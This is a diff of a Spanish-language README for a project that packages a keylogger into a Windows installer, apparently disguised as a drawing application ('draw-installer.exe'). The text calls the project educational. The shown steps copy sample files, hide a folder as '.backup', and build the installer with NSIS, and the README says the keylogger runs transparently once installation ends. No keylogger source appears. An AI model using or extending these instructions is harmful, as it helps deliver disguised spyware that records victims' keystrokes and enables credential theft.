@@ -1,6 +1,6 @@
 # Instalador de un keylogger en una victima Windows
 
-Este proyecto está desarrollado solo para fines educativos. 
+Este proyecto está desarrollado solo para fines educativos.
 
 ## Idea de ataque en windows con keylogger:
 
@@ -34,18 +34,15 @@ Una vez finaliza la instalación se ejecuta el keylogger de forma transparente a
 
 Pasos para generar el instalador:
 
-- Copiar y renombrar `excalidraw.url.dist_sample` `installer.nsi.dist_sample` y `LEEME.txt.dist_sample` en la carpeta `dist`.
-
-```
-copy excalidraw.url.dist_sample dist\excalidraw.url
-copy installer.nsi.dist_sample dist\installer.nsi
-copy LEEME.txt.dist_sample dist\LEEME.txt
-```
-
+- Copiar y renombrar `draw.url.dist_sample` `installer.nsi.dist_sample` y `LEEME.txt.dist_sample` en la carpeta `dist`.
 - Renombrar la carpeta `dist/draw` por `dist/.backup`
 
 ```
+copy draw.url.dist_sample dist\draw.url
+copy installer.nsi.dist_sample dist\installer.nsi
+copy LEEME.txt.dist_sample dist\LEEME.txt
 move dist\draw dist\.backup
+
 ```
 
 - Ejecutar el script `dist\installer.nsi` con NSIS para generar el instalador `draw-installer.exe`
